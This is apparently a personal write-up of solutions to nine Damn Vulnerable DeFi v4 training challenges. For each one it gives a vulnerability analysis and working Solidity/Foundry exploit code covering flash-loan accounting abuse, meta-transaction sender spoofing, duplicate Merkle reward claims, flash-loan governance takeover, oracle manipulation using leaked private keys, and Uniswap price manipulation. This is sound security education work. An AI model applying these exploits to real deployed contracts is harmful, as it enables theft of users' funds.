# damn vulnerable defi solutuions

Here I solve Damn Vulnerable DeFi v4 challenges: https://www.damnvulnerabledefi.xyz/

In the explanations below, I assume that you are familiar with contracts.

[1. Unstoppable](#1-unstoppable)      
[2. Naive Receiver](#2-naive-receiver)  
[3. Truster](#3-truster)    
[4. Side Entrance](#4-side-entrance)   
[5. The Rewarder](#5-the-rewarder)  
[6. Selfie](#6-selfie)     
[7. Compromised](#7-compromised)    
[8. Puppet](#8-puppet)  
[9. Puppet-V2](#9-puppet-v2)

## 1. Unstoppable

### Challenge Overview

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### Contracts

UnstoppableVault.sol - main logic      
UnstoppableMonitor.sol - monitoring if vault is functional      
      
### Vulnerability Analysis

In the UnstoppableVault.sol contract, we have a flashLoan function, where the core functionality is implemented. If we break this function, the vault will stop giving loans.

There are 3 checkings before the function starts executing the loan

      if (amount == 0) revert InvalidAmount(0); // fail early
      if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
      uint256 balanceBefore = totalAssets();
      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This is the critical part. If we succeed in making the function always fail one of those checks, the vault will stop giving loans.
The only checking that is not dependent on function parameters is the third one. 

      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This check creates a strict requirement that the vault's accounting system always match the actual token balance. 

### Solution

By simply sending DVT tokens to the contract balance, we will successfully break the vault!

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }



## 2. Naive receiver

### Challenge Overview

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Contracts:

NaiveRecevierPool.sol - The main pool that enables flash loans  
FlashLoanReceiver.sol - The victim borrower contract that will be drained      
BasicForwarder.sol - Enables meta-transactions through an EIP-712 system      
Multicall.sol - Allows batching multiple function calls into one transaction

### Vulnerability Analysis

So, we need to drain 1010 WETH from the pool and borrower contract. In NaiveReceiver.sol, we have the flashLoan function, which implements the core loan functionality. It calls the borrower's onFlashLoan() function, and here, we have our first critical security problem.

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

The onFlashLoan() function only checks if the caller is the pool, but it doesn't check if the transaction initiator is the actual owner of the contract. This means that anyone can call the transaction on the owner's behalf, and here is the solution to the first part of our challenge. As the fee of the loan is 1 ETH, we can drain the borrower's balance by simply calling the loan function 10 times on the owner's behalf. Now, all 1010 ETH are on the contract's balance and belong to the pool deployer.
We also need to drain the pool's balance. If we look closer to withdraw function, we'll see that the function does not check if the receiver is the initiator of the withdrawal. 

    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

So we can put our address as the receiver. But there is a problem here. We, as msg.sender, don't have any balance in the pool's accounting. If we look closer at how _msgSender() function retrieves the initiator's address, we'll find the second security problem!

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }

Here, if _msgSender() got the request from trustedForwarder and it has msg.data appended to it, it will return the address appended to the request. So here, we can simply initiate a withdrawal request through Forwarder and append the deployer's address to it. The withdraw function will receive the deployer's address and will transfer all the funds to the specified receiver!

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        uint8 numberOfCalls = 11;

        // Create an array of encoded flashLoan calls
        bytes[] memory encodedCalls = new bytes[](numberOfCalls);

        for(uint8 i = 0; i < 10; i++) {
            // Encode the call to flashLoan
            encodedCalls[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }

        // Encode the call to withdraw
        encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
            bytes32(uint256(uint160(deployer)))
        );

        // Encode the multicall data
        bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);

        // Create the request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: 1 days
        });

        // Hash the request
        bytes32 requestHash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
            )
        );

        // Sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the transaction
        forwarder.execute(request, signature);
    }


## 3. Truster

### Challenge Overview 

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Contracts

TrusterLenderPool.sol

### Vulnerability Analysis

The pool's core functionality is implemented in the flashLoan function. At the end of the function, it checks if the funds are fully refunded, so we need to find a way to get the DVT tokens after the function execution. 
If we look closer, we can see that the contract lets us make an arbitrary function call.

    target.functionCall(data);

This means that we can call any function we want from the flashLoan function. So if we make the pool contract to approve the DVT tokens for us, later we can transfer them to our recovery address. 

### Solution

    contract Drainer {
        constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
            bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            );

            pool.flashLoan(0, address(this), address(token), data);

            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
        }
    }

    /**
    * CODE YOUR SOLUTION HERE
    */
    function test_truster() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(token, pool, recovery);
    }


## 4. Side entrance

### Challenge Overview

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

### Vulnerability Analysis

In the flashLoan() function, we can see that we have an opportunity to call our implementation of the execute() function. 
The function checks if we refund the ETH to the contract, but it doesn't control the way we do that. 

The root issue is that the contract doesn't distinguish between "repayment of a loan" and "making a deposit" - they both increase the contract's ETH balance, but have very different accounting implications. 

Attack flow:
1. Call flashLoan() to borrow all ETH from the pool
2. In our execute() function, deposit the borrowed ETH back into the pool
3. The pool's balance is restored (passing the check), but now we have credit in the pool's accounting system
4. Call withdraw() to drain the pool of all funds

This attack allows us to drain all ETH from the pool without actually owning any legitimate stake in it.

### Solution

    contract MyIFlashLoanEtherReceiver {
        SideEntranceLenderPool pool;
        address payable recovery;
        
        constructor(address _pool, address payable _recovery) {
            recovery = _recovery;
            pool = SideEntranceLenderPool(_pool);
        }

        function callFlashLoan(uint256 amount) external {
            pool.flashLoan(amount);
        }

        function execute() external payable {
            pool.deposit{value: msg.value}();
        }

        function withdraw() public {
            pool.withdraw();
            (bool success, ) = recovery.call{value: address(this).balance}("");
        }

        receive() external payable {}

    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        MyIFlashLoanEtherReceiver loanReceiver = new MyIFlashLoanEtherReceiver(address(pool), payable(recovery));
        loanReceiver.callFlashLoan(ETHER_IN_POOL);
        loanReceiver.withdraw();
    }

## 5. The rewarder

### Challenge Overview

A contract is distributing rewards of Damn Valuable Tokens and WETH.    
To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.  
Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.   
Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

### Vulnerability Analysis

The only way to get the funds is the claimRewards() function, so let's focus on that. The function allows us to claim both DVT and WETH rewards with one request. 
The first vulnerability we can notice is that the function marks our reward claimed in two cases:
    1. During the last iteration
    2. When the token to claim changes

Also, there's no limit on how many claims we can process in a single transaction. This creates an exploit path where we can submit multiple identical claims (using the same valid Merkle proof since 'player' is a legitimate beneficiary) for the same token and batch. Since the contract only marks claims as claimed at token switches or at the end of processing, we can claim our reward multiple times and drain the contract.

Attack flow:
1. Read the distribution JSON files to find our legitimate claim amount for DVT and WETH tokens
2. Create an array of multiple claims for the same token and same batch (batch 0)
3. For each token:
   - Make the first claim with a valid Merkle proof (since our address is on the beneficiary list)
   - Make multiple subsequent claims with the same Merkle proof
   - The contract will verify the proof for each claim, but only mark the batch as claimed after processing all claims
4. Execute the transaction to drain nearly all tokens from the distributor 
5. Transfer all recovered assets to the designated recovery account

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtDistributuion = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtDistributuion), (Reward[]));

        string memory wethDistribution = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethDistribution), (Reward[]));

        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
    
        uint256 dvtAmount;
        bytes32[] memory dvtProof;
        for (uint256 i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                dvtAmount = dvtRewards[i].amount;
                dvtProof = merkle.getProof(dvtLeaves, i);
                break;
            }
        }

        uint256 wethAmount;
        bytes32[] memory wethProof;
        for (uint256 i = 0; i < wethRewards.length; i++) {
            if (wethRewards[i].beneficiary == player) {
                wethAmount = wethRewards[i].amount;
                wethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }

        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;

        Claim[] memory claims = new Claim[](totalClaimsNeeded);
        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
            if (i < dvtClaimsNeeded) {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: dvtAmount,
                    tokenIndex: 0,
                    proof: dvtProof
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: wethAmount,
                    tokenIndex: 1,
                    proof: wethProof
                });
            }
        }

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        distributor.claimRewards(claims, tokens);

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }


## 6. Selfie

### Challenge Overview

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.  
What could go wrong, right ?    
You start with no DVT tokens in balance, and the pool has 1.5 million at risk.  
Rescue all funds from the pool and deposit them into the designated recovery account.

### Vulnerability Analysis

The first vulnerability we can see is that the contract lets us take all of its tokens as a loan. The second fundamental issue is that the governance mechanism doesn't differentiate between token holders and accounts that only momentarily hold tokens (like during a flash loan). This creates a critical vulnerability where temporary capital can be used to influence governance decisions with permanent consequences.

Attack flow:

1. Take a flash loan of the majority of DVT tokens
2. Use these temporarily held tokens to self-delegate voting power
3. Queue a governance proposal to call emergencyExit() with a destination address they control
4. Return the flash-loaned tokens
5. Execute the queued action to drain the pool

### Solution

    contract Drainer is IERC3156FlashBorrower {
        SelfiePool pool;
        SimpleGovernance governance;
        DamnValuableVotes token;
        address recovery;
        uint256 actionId;
        bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

        constructor(address _pool, address _governance, address _token, address _recovery) {
            pool = SelfiePool(_pool);
            governance = SimpleGovernance(_governance);
            token = DamnValuableVotes(_token);
            recovery = _recovery;
        }

        function startAttack() external {
            uint256 amount = SelfiePool(pool).maxFlashLoan(address(token));
            SelfiePool(pool).flashLoan(this, address(token), amount, "");
        }

        function onFlashLoan(
            address sender,
            address _token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {

            require(msg.sender == address(pool), "Pool is not sender");
            require(sender == address(this), "Sender is not the owner");

            token.delegate(address(this));

            bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);
            actionId = governance.queueAction(address(pool), 0, payload);

            token.approve(address(pool), amount);
            return CALLBACK_SUCCESS;
        }

        function executeProposal() external {
            governance.executeAction(actionId);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(address(pool), address(governance), address(token), recovery);
        drainer.startAttack();
        vm.warp(block.timestamp + 2 days);
        drainer.executeProposal();
    }


## 7. Compromised

### Challenge Overview

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:  

```
HTTP/2 200 OK   
content-type: text/html 
content-language: en    
vary: Accept-Encoding   
server: cloudflare  

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30 

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35 
``` 

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.  
This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.    
Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

### Vulnerability Analysis

The challenge presents a strange server response from a popular DeFi project. While the `content-type` header indicates `text/html`, the actual content is hexadecimal data - a clear sign of a potential data leak.
The data leak can be something critical. Converting the hex data to ASCII revealed base64-encoded strings. Decoding these base64 strings reveled a string very similar Ethereum private key. Using the Foundry cast command `cast wallet address --private-key $PRIVATE_KEY`, we confirmed that the decoded strings were indeed private keys corresponding to two of the three trusted oracle reporters. This means that we can manipulate the NFT price.   

Attack flow:

1. Extract private keys from leaked data    
2. Manipulate the price downward    
3. Buy NFT at the manipulated price 
4. Reset oracle price   
5. Sell NFT at the inflated price   

### Solution

   /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        uint256 price = oracle.getMedianPrice("DVNFT");

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1 wei}();
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

    }


## 8. Puppet    

### Challenge Overview  

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.  
There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.   
Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.   

### Vulnerability Analysis

The Puppet challenge presents a classic price oracle manipulation vulnerability in a DeFi lending protocol. The lending pool uses a Uniswap V1 exchange as its price oracle without any safeguards against manipulation.
The core vulnerability lies in the price oracle implementation within the PuppetPool contract. The _computeOraclePrice() function directly calculates the DVT/ETH price based on the current balances in the Uniswap pool:

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }

This implementation is highly vulnerable because it relies on a single liquidity source with extremely low liquidity and the price can be easily manipulated by changing the token balances in the pool.

Attack flow:    

1. Approve the Uniswap exchange to spend our DVT tokens 
2. Sell a large amount of our DVT tokens to the Uniswap exchange    
3. The price oracle now calculates a much lower price for DVT (because there's much more DVT in the pool)   
4. Calculate the new, manipulated collateral requirement    
5. Borrow all 100,000 DVT tokens from the lending pool using the minimal collateral requirement 
6. Send the borrowed tokens directly to the recovery address    

### Solution

contract Attacker {

    DamnValuableToken token;
    PuppetPool pool;
    IUniswapV1Exchange exchange;
    address recovery;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    
    constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
        token = _token;
        pool = _pool;
        exchange = _exchange;
        recovery = _recovery;
    }

    function startAttack() public {
        token.approve(address(exchange), 1000e18);
        exchange.tokenToEthSwapInput(1000e18, 1e18, block.timestamp + 1 days);
        uint256 collateralRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        pool.borrow{value: collateralRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable{}
}

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: 25e18}(token, lendingPool, uniswapV1Exchange, recovery);
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        attacker.startAttack();
    }


## Puppet V2    

### Challenge Overview  

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.   
Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?  
You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!    
Save all funds from the pool, depositing them into the designated recovery account. 


### Vulnerability Analysis  

The Puppet V2 challenge exposes a persistent price oracle manipulation vulnerability despite upgrading from Uniswap V1 to V2. The lending pool now uses Uniswap V2 and wrapped ETH (WETH) as collateral, but the fundamental flaw remains.  
The core vulnerability lies in the _getOracleQuote() function within the PuppetV2Pool contract:

    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }   

This implementation is vulnerable because it still relies on the instantaneous state of a single liquidity pool and the oracle still uses current reserves to calculate the price. This means that the price can be manipulated by executing a large swap that significantly alters the reserves ratio. 

Attack flow:    

1. Convert ETH to WETH since the pool now uses WETH instead of native ETH   
2. Swap a large amount of DVT tokens for WETH through Uniswap V2    
3. The manipulated ratio makes DVT appear much less valuable relative to WETH   
4. Calculate the now greatly reduced collateral requirement 
5. Approve and deposit the minimal required WETH as collateral  
6. Borrow the entire DVT balance from the lending pool  
7. Transfer all tokens to the recovery address  

### Solution    

    contract Attacker is Test{
        WETH weth;
        DamnValuableToken token;
        IUniswapV2Router02 uniswapV2Router;
        PuppetV2Pool lendingPool;
        address recovery;
        uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
        uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

        constructor(
            address payable _weth,
            address _token,
            address _uniswapV2Router,
            address _lendingPool,
            address _recovery
        ) payable {
            weth = WETH(_weth);
            token = DamnValuableToken(_token);
            uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
            lendingPool = PuppetV2Pool(_lendingPool);
            recovery = _recovery;
        }

        function startAttack() external {
            weth.deposit{value: address(this).balance}();
            token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

            address[] memory path = new address[](2);
            path[0] = address(token);
            path[1] = address(weth);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                PLAYER_INITIAL_TOKEN_BALANCE,
                9e18,
                path,
                address(this),
                block.timestamp
            );

            uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
            weth.approve(address(lendingPool), amount);
            lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
            token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        }

        function recieve() external payable {}
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: 20e18}(
            payable(address(weth)),
            address(token),
            address(uniswapV2Router),
            address(lendingPool),
            recovery
        );
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);

        attacker.startAttack();
    }
